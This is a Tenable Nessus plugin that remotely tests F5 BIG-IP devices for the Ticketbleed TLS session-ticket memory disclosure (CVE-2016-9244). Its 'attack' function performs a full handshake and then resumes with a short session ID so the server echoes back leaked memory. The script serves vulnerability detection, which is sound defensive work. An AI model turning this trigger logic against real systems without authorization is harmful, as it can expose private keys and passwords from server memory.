#TRUSTED 1de47caa0987f3466887f854d33e69814f73dfb86ecd015a00a668d8808da19097b7736fbb4adc2124bf2e713babf1b5d6c3ac70bb66ad0eb04672e178a1810f9ec65cc64cd012f8d30945c3e54f59df093819cba872e85f782c53074a2798d400fb07a471587de9d66e6eaf64d6a4c6bddfc11de0c2afdfbc90bf28376c181c97e8b535bc60acfb68671bb0f8cbe4b395b12c34e2ee8dad2e2389663889063e2893306b0e9372710a59b93bc76b2c1e40dbd111a698c3ecda6f24c3820d396821a484cf31fff201c5d06ae474929beacb1e7c5c16fd58700cf0c289a2ac4629a7937dc9f0c18a5aeec482805fe73cfe91211a872cd8231af4ebcb34c1de1eaecd9829333386c3c4130b5b921689769c7f5797bf6c1639fc5720a1cde2a5e8e688c3592dfdbc78e19158bf2e5eb504b52ca1b823fb121e950d3f7636a462bd797deda1842b953851a358a577eb32c2cbb52dbb69105d788a70f105d6059814b32ac65dc1e46642462961b0c8fd45bb29b0a1347d06437da4c29681a033c406be03cdf319f466a0bdacd3d7e1cd9dcdbf279ee675ff8a42c84199bbc558e72364117b33b1faf937decc9cab9b28a01609a65bbc5ca8d118e509078e30be3580516110867d7691079e527177e1d740afacc1f1d4625c7280b7625623e10173a360c474e57499a1e676e9adf093bceadcdda8b8445c924046a0f0f01d1bea84ac0f
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97191);
  script_version("1.3");
  script_set_attribute(attribute:"plugin_modification_date", value:"2017/02/15");

  script_cve_id("CVE-2016-9244");
  script_osvdb_id(151764);
  script_xref(name:"EDB-ID", value:"41298");

  script_name(english:"F5 TLS Session Ticket Implementation Remote Memory Disclosure (Ticketbleed) (uncredentialed check)");
  script_summary(english:"Renegotiates with a session ticket, and observes the session ID used by the server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Based on its response to a resumed TLS connection, the remote
service appears to be affected by an information disclosure
vulnerability, known as Ticketbeed, in the TLS Session Ticket
implementation. The issue is due to the server incorrectly echoing
back 32 bytes of memory, even if the Session ID was shorter. A remote
attacker can exploit this vulnerability, by providing a 1-byte Session
ID, to disclose up to 31 bytes of uninitialized memory which may
contain sensitive information such as private keys, passwords, and
other sensitive data.

Note that this vulnerability is only exploitable if the non-default
Session Tickets option enabled.");
  script_set_attribute(attribute:"see_also", value:"http://ticketbleed.com/");
  script_set_attribute(attribute:"see_also", value:"https://blog.filippo.io/finding-ticketbleed/");
  script_set_attribute(attribute:"see_also", value:"https://support.f5.com/csp/article/K05121675");
  script_set_attribute(attribute:"solution", value:
"Upgrade to a fixed version according to the vendor advisory
(K05121675). Alternatively, disable the Session Ticket option on the
affected Client SSL profile.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/02/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/02/15");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_access_policy_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_advanced_firewall_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_application_acceleration_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_application_security_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_application_visibility_and_reporting");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_global_traffic_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_link_controller");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_local_traffic_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_policy_enforcement_manager");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:f5:big-ip_analytics");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:f5:big-ip");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:f5:big-ip_protocol_security_manager");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("ssl_supported_versions.nasl");
  script_require_ports("SSL/Supported");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("x509_func.inc");
include("rsync.inc");
include("acap_func.inc");
include("ftp_func.inc");
include("imap_func.inc");
include("ldap_func.inc");
include("nntp_func.inc");
include("pop3_func.inc");
include("smtp_func.inc");
include("telnet2_func.inc");
include("xmpp_func.inc");
include("ssl_funcs.inc");

##
# Checks whether a cipher is in a list of cipher suites.
#
# @anonparam cipher Cipher in question.
# @anonparam ciphers List of cipher suites.
#
# @return TRUE for success, FALSE otherwise.
##
function tls_cipher_in_list()
{
  local_var cipher, ciphers, i, id, len;

  cipher = _FCT_ANON_ARGS[0];
  ciphers = _FCT_ANON_ARGS[1];

  len = strlen(ciphers);
  for (i = 0; i < len; i += 2)
  {
    id = substr(ciphers, i, i + 2 - 1);
    if (cipher == id) return TRUE;
  }

  return FALSE;
}

##
# Pad the data for AES
# Assumes AES, so a blocksize of 16 is assumed
##
function tls_pad(data)
{
  local_var padlen;
  # Pad the message
  padlen = 16 - ((strlen(data) + 1) % 16);
  if (padlen == 0)
    padlen = 15;
  return data + crap(data:mkbyte(padlen), length:padlen + 1);
}

##
# Computes the MAC of the data.
#
# @param client Whether the data is from the client or server.
# @param data The data to calculate the MAC of.
# @param type The type of the record.
#
# @returns The MAC of the given data, in protocol-specific form.
##
function tls_mac(key, seq, data, type, cipher_desc, version)
{
  local_var hmac;

  # Encode the client sequence number.
  seq = mkdword(0) + mkdword(seq);

  if ('Mac=SHA512' >< cipher_desc)
    hmac = @HMAC_SHA512;

  if ('Mac=SHA384' >< cipher_desc && defined_func("HMAC_SHA384"))
    hmac = @HMAC_SHA384;

  if ('Mac=SHA256' >< cipher_desc)
    hmac = @HMAC_SHA256;

  if ('Mac=SHA224' >< cipher_desc)
    hmac = @HMAC_SHA224;

  if ('Mac=SHA1' >< cipher_desc)
    hmac = @HMAC_SHA1;

  if ('Mac=MD5' >< cipher_desc)
    hmac = @HMAC_MD5;

  if (isnull(hmac))
    return NULL;

  return hmac(
    key:key,
    data:seq + tls_mk_record(type:type, data:data, version:version)
  );
}

##
# Split the key block into IVs, cipher keys, and MAC keys.
#
# @anonparam keyblk Key block derived from the master secret.
#
# @return TRUE for success, FALSE otherwise.
##
function tls_set_keys(cipher_desc, keyblk)
{
  local_var mac_size, iv_size, key_size, pos, tls;

  # Determine the size of the key block's fields.
  if ('Mac=SHA1' >< cipher_desc)        mac_size = 20;
  else if ('Mac=SHA256' >< cipher_desc) mac_size = 32;
  else return FALSE;

  if ('Enc=AES-CBC(128)' >< cipher_desc)      { key_size = 16; iv_size = 16; }
  else if ('Enc=AES-CBC(256)' >< cipher_desc) { key_size = 32; iv_size = 16; }
  else return FALSE;

  # Ensure the block is big enough.
  if (strlen(keyblk) < 2 * (mac_size + key_size + iv_size))
    return FALSE;

  # Extract the data from the key block.
  pos = 0;
  tls['enc_mac_key'] = substr(keyblk, pos, pos + mac_size - 1); pos += mac_size;
  tls['dec_mac_key'] = substr(keyblk, pos, pos + mac_size - 1); pos += mac_size;
  tls['enc_key']     = substr(keyblk, pos, pos + key_size - 1); pos += key_size;
  tls['dec_key']     = substr(keyblk, pos, pos + key_size - 1); pos += key_size;
  tls['enc_iv']      = substr(keyblk, pos, pos + iv_size  - 1); pos += iv_size;
  tls['dec_iv']      = substr(keyblk, pos, pos + iv_size  - 1);

  return tls;
}

##
##
# Tries to make a TLS connection to the server.
#
# @return TRUE for success, FALSE otherwise.
##
function attack(port, ciphers)
{
  local_var soc, data, rec, srv_random, clt_random, version, cipher_desc;
  local_var cert, clt_cert_requested, skex, premaster, n, e, dh_privkey;
  local_var ckex, keyblk, tls_keys, tls_ciphertext, handshake_transcript, master_secret;
  local_var finished, session_ticket, srv_change_cipher_spec_received;
  local_var session_id;

  # Get a socket to perform a handshake.
  soc = open_sock_ssl(port);
  if (!soc)
    return [FALSE, "open_sock_ssl", "Couldn't open TCP or STARTTLS socket to service."];

  data = client_hello(
    v2hello:FALSE,
    version:mkword(TLS_10), # Record-layer version (RFC5246 Appendix E)
    maxver:mkword(TLS_12),  # Handshake version; maximum we support
    cipherspec:ciphers,
    extensions:tls_ext(type:35, data:"") # Session Tickets supported
  );
  send(socket:soc, data:data);
  rec = ssl_parse(blob:data);
  # Hang onto the Client Random; we need it to derive keys later.
  clt_random = mkdword(rec['time']) + rec['random'];

  # Begin collecting bodies of handshake messages (without record layer)
  handshake_transcript = substr(data, 5, strlen(data) - 1);

  # Read records one at a time. Expect to see at a minimum:
  # ServerHello, Certificate, and ServerHelloDone.
  while (TRUE)
  {
    # Receive a record from the server.
    data = recv_ssl(socket:soc);
    if (isnull(data))
    {
      close(soc);
      return [FALSE, "recv_ssl", "Did not receive expected messages from server in reply to ClientHello."];
    }

    # Continue collecting bodies of handshake messages (stripping off
    # record-layer header)
    if (!isnull(ssl_find(blob:data, 'content_type', SSL3_CONTENT_TYPE_HANDSHAKE)))
      handshake_transcript += substr(data, 5, strlen(data) - 1);

    # ServerHello: Extract the random data for computation of keys.
    rec = ssl_find(
      blob:data,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO
    );

    if (!isnull(rec))
    {
      if (rec['extension_session_ticket'] != TRUE)
        return [FALSE, "ticket_support", "Server does not support TLS Session Tickets."];

      # If server asks for version less than TLS 1.0 or higher than TLS 1.2, fail.
      if (rec['handshake_version'] < TLS_10 || rec['handshake_version'] > TLS_12)
        return [FALSE, "handshake_version", "Server does not support TLS 1.0, 1.1, or 1.2."];

      # Use the TLS version the server wants
      version = rec['handshake_version'];

      srv_random = mkdword(rec['time']) + rec['random'];

      # Wacko SSL servers might return a cipher suite not in the
      # client's request list.
      if (!tls_cipher_in_list(mkword(rec['cipher_spec']), ciphers))
      {
        close(soc);
        return [FALSE, "cipher_spec", "Server ignored our list of supported ciphers."];
      }

      # Store the negotiated cipher suite.
      cipher_desc = ciphers_desc[cipher_name(id:rec['cipher_spec'])];

      if (isnull(cipher_desc))
      {
        close(soc);
        return [FALSE, "cipher_spec", "Assertion failure."];
      }
    }

    # Certificate: Extract the server's public key.
    rec = ssl_find(
      blob:data,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_CERTIFICATE
    );

    if (!isnull(rec) && max_index(rec['certificates']) > 0)
    {
      # First cert in the chain should be the server cert.
      cert = parse_der_cert(cert:rec['certificates'][0]);
      if (isnull(cert))
      {
        close(soc);
        return [FALSE, "parse_der_cert", "Failed to parse server's certificate."];
      }
      cert = cert['tbsCertificate'];
    }

    # Server Key Exchange.
    rec = ssl_find(
      blob:data,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_KEY_EXCHANGE
    );

    if (!isnull(rec['data']))
      skex = ssl_parse_srv_kex(blob:rec['data'], cipher:cipher_desc, version:version);

    # Certificate Request.
    rec = ssl_find(
      blob:data,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_CERTIFICATE_REQUEST
    );

    if (!isnull(rec['data']))
      clt_cert_requested = TRUE;

    # Server Hello Done.
    rec = ssl_find(
      blob:data,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO_DONE
    );

    # When we get a ServerHelloDone, it's our turn to send again.
    if (!isnull(rec))
      break;

    # Is it an alert?
    rec = ssl_find(
      blob:data,
      encrypted:FALSE,
      'content_type', SSL3_CONTENT_TYPE_ALERT
    );

    if (!isnull(rec))
    {
      close(soc);
      return [FALSE, "handshake_failure", "Server sent alert to ClientHello. Level: " + rec['level'] + ", description: " + rec['description']];
    }
  }

  # Will contain an empty ClientCertificate (if requested), ClientKeyExchange,
  data = '';

  # Create an empty client certificate if one is requested.
  if (clt_cert_requested)
  {
    # Send an empty certificate for now. TLSv1.0 says the client can
    # send an empty certificate.
    data += tls_mk_record(
      type:SSL3_CONTENT_TYPE_HANDSHAKE,
      version:version,
      data:ssl_mk_handshake_msg(
        type : SSL3_HANDSHAKE_TYPE_CERTIFICATE,
        data : ssl_vldata_put(data:NULL,len:3)
      )
    );
    handshake_transcript += substr(data, 5, strlen(data) - 1);
  }

  # Process ServerCertificate and ServerKeyExchange messages.
  if (cipher_desc =~ "Kx=RSA[(|]")
  {
    if (isnull(cert))
    {
      close(soc);
      return [FALSE, "rsa_kx", "Server selected RSA key exchange but didn't provide a certificate."];
    }

    if (isnull(cert['subjectPublicKeyInfo']) || isnull(cert['subjectPublicKeyInfo'][1]))
    {
      close(soc);
      return [FALSE, "rsa_kx", "A server certificate with an unsupported algorithm was found."];
    }

    n = cert['subjectPublicKeyInfo'][1][0];
    e = cert['subjectPublicKeyInfo'][1][1];

    if (isnull(n) || isnull(e))
    {
      close(soc);
      return [FALSE, "rsa_kx", "Failed to extract public key from server certificate."];
    }

    premaster = mkword(TLS_12) + rand_str(length:46);

    # Encrypt the premaster secret with server's RSA public key.
    ckex = rsa_public_encrypt(data:premaster, n:n, e:e);

    # It looks like TLS 1.0 and up prepend a two-byte length, but the
    # RFC is vague.
    if (version >= TLS_10)
      ckex = ssl_vldata_put(data:ckex, len:2);
  }
  else if (cipher_desc =~ "Kx=DH[(|]")
  {
    if (isnull(skex))
    {
      close(soc);
      return [FALSE, "dh_kx", "Server selected DH key exchange but didn't provide a ServerKeyExchange."];
    }

    # Generate the client private key,
    dh_privkey = rand_str(length:16);

    # Compute the premaster secret.
    premaster = bn_mod_exp(skex['dh_y'], dh_privkey, skex['dh_p']);

    # Encode the client's DH public key
    ckex = ssl_vldata_put(
      data:bn_mod_exp(skex['dh_g'], dh_privkey, skex['dh_p']),
      len:2
    );
  }
  else
  {
    close(soc);
    return [FALSE, "kx", "Unsupported key exchange method."];
  }

  # Create a ClientKeyExchange record
  data += tls_mk_record(
    type:SSL3_CONTENT_TYPE_HANDSHAKE,
    version:version,
    data:ssl_mk_handshake_msg(
      type:SSL3_HANDSHAKE_TYPE_CLIENT_KEY_EXCHANGE,
      data:ckex
    )
  );
  handshake_transcript += substr(data, 5, strlen(data) - 1);

  master_secret = ssl_calc_master(
    c_random:clt_random,
    s_random:srv_random,
    version:version,
    premaster:premaster
  );

  # For troubleshooting problems, when a PCAP is provided by a customer
  # and we need to see the encrypted Finished message or alert messages.
  set_kb_item(
    name:"nss_keylog/" + SCRIPT_NAME,
    value:"CLIENT_RANDOM " + hexstr(clt_random) + " " + hexstr(master_secret)
  );

  tls_keys = tls_set_keys(
    cipher_desc:cipher_desc,
    keyblk:ssl_derive_keyblk(
      c_random:clt_random,
      s_random:srv_random,
      version:version,
      master:master_secret
    )
  );

  if (tls_keys == FALSE)
  {
    close(soc);
    return [FALSE, "kx", "Failed to make TLS keys from key exchange."];
  }

  data += tls_mk_record(
    type:SSL3_CONTENT_TYPE_CHANGECIPHERSPEC,
    data:mkbyte(1),
    version:version
  );

  finished = ssl_mk_handshake_msg(
    type:SSL3_HANDSHAKE_TYPE_FINISHED,
    data:ssl_calc_finished(
      master:master_secret,
      handshake:handshake_transcript,
      is_client:TRUE,
      version:version
    )
  );
  handshake_transcript += finished;

  # MAC the finished message
  finished += tls_mac(key:tls_keys['enc_mac_key'], seq:0, version:version, type:SSL3_CONTENT_TYPE_HANDSHAKE, cipher_desc:cipher_desc, data:finished);

  # Use a random IV, as it's included explicitly in TLS 1.1
  if (version >= TLS_11)
    tls_keys['enc_iv'] = rand_str(length:strlen(tls_keys['enc_iv']));

  finished = tls_pad(data:finished);

  # Encrypt the finished message
  tls_ciphertext = aes_cbc_encrypt(
    data:finished,
    iv:tls_keys['enc_iv'],
    key:tls_keys['enc_key']
  );

  # TLS 1.1+ explicitly includes the IV in each record
  if (version >= TLS_11)
  {
    tls_ciphertext = tls_keys['enc_iv'] + tls_ciphertext[0];
  }
  # In TLS 1.0 we don't include the IV in the record, and we do have
  # to hang onto the CBC residue for the next record.
  else
  {
    tls_keys['enc_iv'] = tls_ciphertext[1];
    tls_ciphertext = tls_ciphertext[0];
  }

  data += tls_mk_record(
    type:SSL3_CONTENT_TYPE_HANDSHAKE,
    data:tls_ciphertext,
    version:version
  );

  # Send the ChangeCipherSpec and the Finished message
  send(socket:soc, data:data);

  while (TRUE)
  {
    # Receive a record from the server.
    data = recv_ssl(socket:soc);
    if (isnull(data))
    {
      close(soc);
      return [FALSE, "after_ckex", "Server did not send all expected messages in its last flight of handshakes."];
    }

    # Is it an alert?
    rec = ssl_find(
      blob:data,
      encrypted:FALSE,
      'content_type', SSL3_CONTENT_TYPE_ALERT
    );
    if (!isnull(rec))
    {
      close(soc);
      if (clt_cert_requested)
        return [FALSE, "after_ckex", "Server sent an alert to our ClientKeyExchange (and a client certificate was requested)."];
      else
        return [FALSE, "after_ckex", "Server sent an alert to our ClientKeyExchange."];
    }

    # Keep collecting handshake bodies, only for not-encrypted handshake bodies
    if (ssl_find(blob:data, encrypted:FALSE, 'content_type', SSL3_CONTENT_TYPE_HANDSHAKE))
      handshake_transcript += substr(data, 5, strlen(data) - 1);

    # The session ticket
    rec = ssl_find(
      blob:data,
      encrypted:FALSE,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
      'handshake_type', SSL3_HANDSHAKE_TYPE_NEW_SESSION_TICKET
    );
    if (!isnull(rec))
      session_ticket = rec['ticket'];

    rec = ssl_find(
      blob:data,
      encrypted:FALSE,
      'content_type', SSL3_CONTENT_TYPE_CHANGECIPHERSPEC
    );
    if (!isnull(rec))
      srv_change_cipher_spec_received = TRUE;

    # Looking for the encrypted Finished message
    # When we get it we're done receiving and we're ready to close
    # the connection with a close_notify alert
    rec = ssl_find(
      blob:data,
      encrypted:TRUE,
      'content_type', SSL3_CONTENT_TYPE_HANDSHAKE
    );
    if (!isnull(rec) && srv_change_cipher_spec_received)
    {
      if (isnull(session_ticket))
      {
        close(soc);
        return [FALSE, "lied_about_ticket", "Server did not send a session ticket despite indicating support."];
      }

      # TLS 1.1 explicitly includes the IV in the record
      if (version >= TLS_11)
      {
        tls_keys['dec_iv'] = substr(data, 5, strlen(tls_keys['dec_iv']) + 4);
        rec["data"] = substr(data, 5 + strlen(tls_keys['dec_iv']));
      }

      tls_ciphertext = aes_cbc_decrypt(
        data:rec["data"],
        iv:tls_keys['dec_iv'],
        key:tls_keys['dec_key']
      );

      # Retain CBC residue for the next record
      if (version == TLS_10)
        tls_keys['dec_iv'] = tls_ciphertext[1];

      tls_ciphertext = tls_ciphertext[0];
      finished = ssl_mk_handshake_msg(
        type:SSL3_HANDSHAKE_TYPE_FINISHED,
        data:ssl_calc_finished(
          master:master_secret,
          handshake:handshake_transcript,
          is_client:FALSE,
          version:version
        )
      );
      finished += tls_mac(
        key:tls_keys['dec_mac_key'],
        seq:0,
        version:version,
        type:SSL3_CONTENT_TYPE_HANDSHAKE,
        cipher_desc:cipher_desc,
        data:finished
      );
      finished = tls_pad(data:finished);
      if (finished != tls_ciphertext)
      {
        close(soc);
        return [FALSE, "srv_finished", "Server's Finished value or MAC is wrong or key agreement failed."];
      }

      # Server's finished and first encrypted record was correct, so we're
      # ready to send again and have agreed correctly on some keys
      break;
    }
  }

  # We're ready to try resuming, with a new connection.
  close(soc);
  soc = open_sock_ssl(port);
  if (!soc)
    return [FALSE, "open_sock_ssl", "Couldn't open TCP or STARTTLS socket to service to resume."];

  # We send a 20-byte session ID. Max length is 32 bytes.
  session_id = rand_str(length:20);

  data = client_hello(
    v2hello:FALSE,
    version:mkword(TLS_10), # Record-layer version (RFC5246 Appendix E)
    maxver:mkword(TLS_12),  # Handshake version; maximum we support
    cipherspec:ciphers,
    sessionid:session_id,
    extensions:tls_ext(type:35, data:session_ticket)
  );
  send(socket:soc, data:data);
  data = recv_ssl(socket:soc);
  if (isnull(data))
  {
    close(soc);
    return [FALSE, "resume", "Server didn't reply to resumed connection attempt."];
  }

  # We're done receiving now
  close(soc);

  rec = ssl_find(
    blob:data,
    encrypted:FALSE,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO
  );
  if (isnull(rec))
    return [FALSE, "resume_serverhello", "Server did not reply with a ServerHello to the resumed connection attempt."];

  if (rec["session_id"] == session_id)
    return [FALSE, "session_id_mismatch", "Server replied with a session ID that matches exactly what Nessus sent."];

  if (strlen(rec["session_id"]) == 0)
    return [FALSE, "session_id_zero", "Server replied with a zero-length session ID."];

  # Vulnerable!
  # Is the session ID from the server bigger than what we sent, and, does it start with the session ID we picked?
  if (strlen(rec["session_id"]) > strlen(session_id) && substr(rec["session_id"], 0, strlen(session_id) - 1) == session_id)
    return [
      TRUE,
      "session_id_length",
      "Nessus sent the " + strlen(session_id) + "-byte session ID " + hexstr(session_id) + ". The server replied with the " + strlen(rec["session_id"]) + "-byte session ID " + hexstr(rec["session_id"]) + "."
    ];

  return [FALSE, "assertion_failure", "Something went wrong with the test."];
}

get_kb_item_or_exit('SSL/Supported');

# Get a port that uses SSL.
port = get_ssl_ports(fork:TRUE);

if (isnull(port))
  exit(1, 'The host does not appear to have any SSL-based services.');

# Find out if the port is open.
if (!get_port_state(port))
  audit(AUDIT_PORT_CLOSED, port, "TCP");

result = attack(port:port, ciphers:
  ciphers['TLS1_CK_RSA_WITH_AES_128_CBC_SHA'] + # <- Required by all TLS 1.2 impls.
  ciphers['TLS1_CK_RSA_WITH_AES_256_CBC_SHA'] +
  ciphers['TLS1_CK_DHE_RSA_WITH_AES_128_CBC_SHA'] +
  ciphers['TLS1_CK_DHE_RSA_WITH_AES_256_CBC_SHA'] +
  ciphers['TLS1_RSA_WITH_AES_128_CBC_SHA256'] +
  ciphers['TLS1_RSA_WITH_AES_256_CBC_SHA256'] +
  ciphers['TLS1_DHE_RSA_WITH_AES_128_CBC_SHA256'] +
  ciphers['TLS1_DHE_RSA_WITH_AES_256_CBC_SHA256']
);

if (result[0] == TRUE)
{
  security_report_v4(
    port:port,
    severity:SECURITY_WARNING,
    extra:result[2]
  );
}
else
{
  exit(0, "Port " + port + ": " + result[2]);
}
